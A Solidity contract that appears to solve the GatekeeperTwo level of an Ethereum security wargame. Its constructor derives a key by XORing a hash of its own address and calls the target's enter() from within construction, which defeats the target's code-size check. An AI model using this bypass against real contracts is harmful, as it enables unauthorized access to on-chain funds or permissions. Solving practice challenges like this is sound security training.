// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
// import {GatekeeperTwo} from "./GatekeeperTwo.sol";

contract AttackGatekeeperTwo is Ownable {
    constructor(address _gatekeeperTwoAddress) Ownable(msg.sender) {
        uint64 _key = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        (bool success, bytes memory err) =
            _gatekeeperTwoAddress.call(abi.encodeWithSignature("enter(bytes8)", bytes8(_key)));
        require(success, string(err));
    }

    function finish() external onlyOwner {
        selfdestruct(payable(owner())); // selfdestruct is deprecated
    }
}
